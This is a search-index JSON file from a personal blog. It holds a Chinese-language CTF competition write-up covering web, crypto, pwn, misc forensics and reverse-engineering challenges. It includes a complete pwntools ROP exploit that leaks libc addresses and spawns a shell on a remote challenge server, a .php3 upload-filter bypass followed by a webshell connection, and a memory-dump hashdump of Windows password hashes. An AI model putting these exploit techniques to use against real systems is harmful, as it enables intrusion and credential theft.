{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to hkkblog","title":"Welcome to hkkblog"},{"location":"#welcome-to-hkkblog","text":"","title":"Welcome to hkkblog"},{"location":"%E5%8F%91%E8%B4%A2writeup/","text":"HXB writeup WEB \u9898\u76ee\u540d\u5b57\u4e0d\u91cd\u8981\u53cd\u6b63\u9898\u633a\u7b80\u5355\u7684 \u76f4\u63a5\u4f20\u53c2file=phpinfo\uff0cflag\u88ab\u5199\u5230\u73af\u5883\u53d8\u91cf NewWebsite \u626b\u63cf\u76ee\u5f55\u626b\u5230/admin \u8bbf\u95ee\u540e\u5f31\u5bc6\u7801admin/admin\u767b\u5f55 \u53d1\u73b0\u6709?r=manageinfo\u9875\u9762\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u6587\u4ef6\u540d\u88ab\u9650\u5236\uff0c\u4f20php3\u5373\u53ef\u7ed5\u8fc7\uff0c\u7136\u540eantsword\u8fde\u63a5 CPYPTO \u53e4\u5178\u7f8e++ \u9898\u76ee\u8bf4\u662f\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u76f4\u63a5\u7206\u7834\u5bc6\u94a5\u5373\u53ef pwn pwn_printf \u6808\u6ea2\u51fa\uff0c\u901a\u8fc7puts\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u504f\u79fb\u91cf\u5f97\u5230system\u51fd\u6570\u5730\u5740\u6765get shell exp\u5982\u4e0b\uff1a from pwn import * context.log_level = 'debug' p = remote('47.111.104.169',56706) elf = ELF('./pwn_printf') puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x0000000000401213 pop_rsi_ret = 0x000401211 ret_addr = 0x4007C6 scanf = 0x004006A0 p.recvuntil(\"interesting\") for i in range(16): p.sendline(\"32\") payload1 = 'a'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x40) + p64(ret_addr) p.sendline(payload1) p.recvline() puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print (hex(puts_addr)) payload2 = 'a'*0x8 + p64(pop_rdi_ret) + p64(0x0401D99) +p64(pop_rsi_ret) +p64(0x06030A0)+p64(0)+ p64(scanf) + p64(pop_rdi_ret) + p64(0x20)+ p64(ret_addr+1) p.recv() str1 = int(b'/bin'[::-1].encode('hex'),16) str2 = int(b'/sh\\x00'[::-1].encode('hex'),16) p.sendline(payload2) sleep(0.5) p.sendline(str(str2)) sleep(0.5) payload3 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(0x06030A4) + p64(0) + p64(scanf) + p64(ret_addr) p.send(payload3) p.sendline(str(n2)) payload4 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x06030A0) + p64(puts_addr-0x2a300) sleep(0.5) p.sendline(payload4) p.interactive() MISC \u989c\u6587\u5b57\u4e4b\u8c1c \u901a\u8fc7\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u5bfc\u51faindex-demo.html \u5728\u6e90\u7801\u4e2d\u53d1\u73b0\u989c\u6587\u5b57 \u5f00\u59cb\u4ee5\u4e3a\u662f\u989c\u6587\u5b57\u7f16\u7801\uff0c\u540e\u6765\u53d1\u73b0\u6709base64\u9690\u5199\uff0c\u7528stegsnow\u53ef\u4ee5\u8f93\u51faflag\u6837\u5f0f base64\u9690\u5199\u811a\u672c b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open('C:/Users/kai/Desktop/base.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) \u7ed3\u679c\u662fkey:\"lorrie\" \u8f93\u51fa\u5185\u5bb9\u731c\u6d4b\u662f\u6469\u65af\u5bc6\u7801\uff0c\u89e3\u7801\u540e\u5f97\u5230flag passwd \u662f\u4e00\u9053\u5185\u5b58\u53d6\u8bc1\u9898 python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02::: CTF\u5bc6\u7801\u89e3\u7801\u51fa\u6765\u662fqwer1234\uff0c\u7136\u540eMD5\u5c31\u662fflag \u865a\u5b9e\u4e4b\u95f4 \u660e\u6587\u653b\u51fb\uff0c\u7206\u51fa\u538b\u7f29\u5305\u5bc6\u7801 123%asd!O \u7136\u540e\u6805\u680f\u5bc6\u7801\u89e3\u7801\u5f97\u5230flag \u9690\u85cf\u7684\u79d8\u5bc6 \u7528diskgenius\u6253\u5f00\u53ef\u4ee5\u770b\u5230 volatility -f 1.vmem --profile=Win2003SP1x86 --profile=\u7cfb\u7edf\u7248\u672c printkey -K \"SAM\\Domains\\Account\\Users\\Names\" \u4e8e\u662f\u5bfc\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6279\u91cf\u89e3MD5\uff0c\u6700\u540e\u5c1d\u8bd5\u5bc6\u7801\u4e3a NIAIWOMA \u7684\u8d26\u6237\u548c\u5bc6\u7801MD5 \u662fflag RE easy_c++ \u7b80\u5355\u5f02\u6216\u76f4\u63a5\u811a\u672c\u8dd1 a=\"7d21e<e3<:3;9;ji t r#w\\\"$*{*+*$|,\" b=\"\" for i in range(len(a)): b+=chr(ord(a[i])^i) print(b) easyre \u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u4f4d\u4e00\u4f4d\u7206\u51fa\u6765 ReMe import hashlib list = [ 'e5438e78ec1de10a2693f9cffb930d23', '08e8e8855af8ea652df54845d21b9d67', 'a905095f0d801abd5865d649a646b397', 'bac8510b0902185146c838cdf8ead8e0', 'f26f009a6dc171e0ca7a4a770fecd326', 'cffd0b9d37e7187483dc8dd19f4a8fa8', '4cb467175ab6763a9867b9ed694a2780', '8e50684ac9ef90dfdc6b2e75f2e23741', 'cffd0b9d37e7187483dc8dd19f4a8fa8', 'fd311e9877c3db59027597352999e91f', '49733de19d912d4ad559736b1ae418a7', '7fb523b42413495cc4e610456d1f1c84', '8e50684ac9ef90dfdc6b2e75f2e23741', 'acb465dc618e6754de2193bf0410aafe', 'bc52c927138231e29e0b05419e741902', '515b7eceeb8f22b53575afec4123e878', '451660d67c64da6de6fadc66079e1d8a', '8e50684ac9ef90dfdc6b2e75f2e23741', 'fe86104ce1853cb140b7ec0412d93837', 'acb465dc618e6754de2193bf0410aafe', 'c2bab7ea31577b955e2c2cac680fb2f4', '8e50684ac9ef90dfdc6b2e75f2e23741', 'f077b3a47c09b44d7077877a5aff3699', '620741f57e7fafe43216d6aa51666f1d', '9e3b206e50925792c3234036de6a25ab', '49733de19d912d4ad559736b1ae418a7', '874992ac91866ce1430687aa9f7121fc' ] def decode(n): result = [] while n != 1: if n%2: n=n*3+1 else: n=n//2 result.append(n) return result if __name__ == \"__main__\": for i in range(33,128): result = decode(i) string = '' for x in range(len(result)): string += str(result[x]) string += str(result[(len(result) - x - 1)]) md5 = hashlib.md5() md5.update(string.encode()) md5 = md5.hexdigest() for line in range(27): if md5 == list[line]: print line,'->',chr(i) \u7136\u540e\u6309\u987a\u5e8f\u6392\u5e8fMD5\u5373\u53ef","title":"HXB writeup"},{"location":"%E5%8F%91%E8%B4%A2writeup/#hxb-writeup","text":"","title":"HXB writeup"},{"location":"%E5%8F%91%E8%B4%A2writeup/#web","text":"","title":"WEB"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_1","text":"\u76f4\u63a5\u4f20\u53c2file=phpinfo\uff0cflag\u88ab\u5199\u5230\u73af\u5883\u53d8\u91cf","title":"\u9898\u76ee\u540d\u5b57\u4e0d\u91cd\u8981\u53cd\u6b63\u9898\u633a\u7b80\u5355\u7684"},{"location":"%E5%8F%91%E8%B4%A2writeup/#newwebsite","text":"\u626b\u63cf\u76ee\u5f55\u626b\u5230/admin \u8bbf\u95ee\u540e\u5f31\u5bc6\u7801admin/admin\u767b\u5f55 \u53d1\u73b0\u6709?r=manageinfo\u9875\u9762\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u6587\u4ef6\u540d\u88ab\u9650\u5236\uff0c\u4f20php3\u5373\u53ef\u7ed5\u8fc7\uff0c\u7136\u540eantsword\u8fde\u63a5","title":"NewWebsite"},{"location":"%E5%8F%91%E8%B4%A2writeup/#cpypto","text":"","title":"CPYPTO"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_2","text":"\u9898\u76ee\u8bf4\u662f\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff0c\u76f4\u63a5\u7206\u7834\u5bc6\u94a5\u5373\u53ef","title":"\u53e4\u5178\u7f8e++"},{"location":"%E5%8F%91%E8%B4%A2writeup/#pwn","text":"","title":"pwn"},{"location":"%E5%8F%91%E8%B4%A2writeup/#pwn_printf","text":"\u6808\u6ea2\u51fa\uff0c\u901a\u8fc7puts\u6cc4\u9732\u51fd\u6570\u5730\u5740\uff0c\u8ba1\u7b97\u504f\u79fb\u91cf\u5f97\u5230system\u51fd\u6570\u5730\u5740\u6765get shell exp\u5982\u4e0b\uff1a from pwn import * context.log_level = 'debug' p = remote('47.111.104.169',56706) elf = ELF('./pwn_printf') puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] pop_rdi_ret = 0x0000000000401213 pop_rsi_ret = 0x000401211 ret_addr = 0x4007C6 scanf = 0x004006A0 p.recvuntil(\"interesting\") for i in range(16): p.sendline(\"32\") payload1 = 'a'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x40) + p64(ret_addr) p.sendline(payload1) p.recvline() puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print (hex(puts_addr)) payload2 = 'a'*0x8 + p64(pop_rdi_ret) + p64(0x0401D99) +p64(pop_rsi_ret) +p64(0x06030A0)+p64(0)+ p64(scanf) + p64(pop_rdi_ret) + p64(0x20)+ p64(ret_addr+1) p.recv() str1 = int(b'/bin'[::-1].encode('hex'),16) str2 = int(b'/sh\\x00'[::-1].encode('hex'),16) p.sendline(payload2) sleep(0.5) p.sendline(str(str2)) sleep(0.5) payload3 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(0x06030A4) + p64(0) + p64(scanf) + p64(ret_addr) p.send(payload3) p.sendline(str(n2)) payload4 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x06030A0) + p64(puts_addr-0x2a300) sleep(0.5) p.sendline(payload4) p.interactive()","title":"pwn_printf"},{"location":"%E5%8F%91%E8%B4%A2writeup/#misc","text":"","title":"MISC"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_3","text":"\u901a\u8fc7\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u5bfc\u51faindex-demo.html \u5728\u6e90\u7801\u4e2d\u53d1\u73b0\u989c\u6587\u5b57 \u5f00\u59cb\u4ee5\u4e3a\u662f\u989c\u6587\u5b57\u7f16\u7801\uff0c\u540e\u6765\u53d1\u73b0\u6709base64\u9690\u5199\uff0c\u7528stegsnow\u53ef\u4ee5\u8f93\u51faflag\u6837\u5f0f base64\u9690\u5199\u811a\u672c b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open('C:/Users/kai/Desktop/base.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) \u7ed3\u679c\u662fkey:\"lorrie\" \u8f93\u51fa\u5185\u5bb9\u731c\u6d4b\u662f\u6469\u65af\u5bc6\u7801\uff0c\u89e3\u7801\u540e\u5f97\u5230flag","title":"\u989c\u6587\u5b57\u4e4b\u8c1c"},{"location":"%E5%8F%91%E8%B4%A2writeup/#passwd","text":"\u662f\u4e00\u9053\u5185\u5b58\u53d6\u8bc1\u9898 python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02::: CTF\u5bc6\u7801\u89e3\u7801\u51fa\u6765\u662fqwer1234\uff0c\u7136\u540eMD5\u5c31\u662fflag","title":"passwd"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_4","text":"\u660e\u6587\u653b\u51fb\uff0c\u7206\u51fa\u538b\u7f29\u5305\u5bc6\u7801 123%asd!O \u7136\u540e\u6805\u680f\u5bc6\u7801\u89e3\u7801\u5f97\u5230flag","title":"\u865a\u5b9e\u4e4b\u95f4"},{"location":"%E5%8F%91%E8%B4%A2writeup/#_5","text":"\u7528diskgenius\u6253\u5f00\u53ef\u4ee5\u770b\u5230 volatility -f 1.vmem --profile=Win2003SP1x86 --profile=\u7cfb\u7edf\u7248\u672c printkey -K \"SAM\\Domains\\Account\\Users\\Names\" \u4e8e\u662f\u5bfc\u51fa\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6279\u91cf\u89e3MD5\uff0c\u6700\u540e\u5c1d\u8bd5\u5bc6\u7801\u4e3a NIAIWOMA \u7684\u8d26\u6237\u548c\u5bc6\u7801MD5 \u662fflag","title":"\u9690\u85cf\u7684\u79d8\u5bc6"},{"location":"%E5%8F%91%E8%B4%A2writeup/#re","text":"","title":"RE"},{"location":"%E5%8F%91%E8%B4%A2writeup/#easy_c","text":"\u7b80\u5355\u5f02\u6216\u76f4\u63a5\u811a\u672c\u8dd1 a=\"7d21e<e3<:3;9;ji t r#w\\\"$*{*+*$|,\" b=\"\" for i in range(len(a)): b+=chr(ord(a[i])^i) print(b)","title":"easy_c++"},{"location":"%E5%8F%91%E8%B4%A2writeup/#easyre","text":"\u52a8\u6001\u8c03\u8bd5\uff0c\u4e00\u4f4d\u4e00\u4f4d\u7206\u51fa\u6765","title":"easyre"},{"location":"%E5%8F%91%E8%B4%A2writeup/#reme","text":"import hashlib list = [ 'e5438e78ec1de10a2693f9cffb930d23', '08e8e8855af8ea652df54845d21b9d67', 'a905095f0d801abd5865d649a646b397', 'bac8510b0902185146c838cdf8ead8e0', 'f26f009a6dc171e0ca7a4a770fecd326', 'cffd0b9d37e7187483dc8dd19f4a8fa8', '4cb467175ab6763a9867b9ed694a2780', '8e50684ac9ef90dfdc6b2e75f2e23741', 'cffd0b9d37e7187483dc8dd19f4a8fa8', 'fd311e9877c3db59027597352999e91f', '49733de19d912d4ad559736b1ae418a7', '7fb523b42413495cc4e610456d1f1c84', '8e50684ac9ef90dfdc6b2e75f2e23741', 'acb465dc618e6754de2193bf0410aafe', 'bc52c927138231e29e0b05419e741902', '515b7eceeb8f22b53575afec4123e878', '451660d67c64da6de6fadc66079e1d8a', '8e50684ac9ef90dfdc6b2e75f2e23741', 'fe86104ce1853cb140b7ec0412d93837', 'acb465dc618e6754de2193bf0410aafe', 'c2bab7ea31577b955e2c2cac680fb2f4', '8e50684ac9ef90dfdc6b2e75f2e23741', 'f077b3a47c09b44d7077877a5aff3699', '620741f57e7fafe43216d6aa51666f1d', '9e3b206e50925792c3234036de6a25ab', '49733de19d912d4ad559736b1ae418a7', '874992ac91866ce1430687aa9f7121fc' ] def decode(n): result = [] while n != 1: if n%2: n=n*3+1 else: n=n//2 result.append(n) return result if __name__ == \"__main__\": for i in range(33,128): result = decode(i) string = '' for x in range(len(result)): string += str(result[x]) string += str(result[(len(result) - x - 1)]) md5 = hashlib.md5() md5.update(string.encode()) md5 = md5.hexdigest() for line in range(27): if md5 == list[line]: print line,'->',chr(i) \u7136\u540e\u6309\u987a\u5e8f\u6392\u5e8fMD5\u5373\u53ef","title":"ReMe"}]}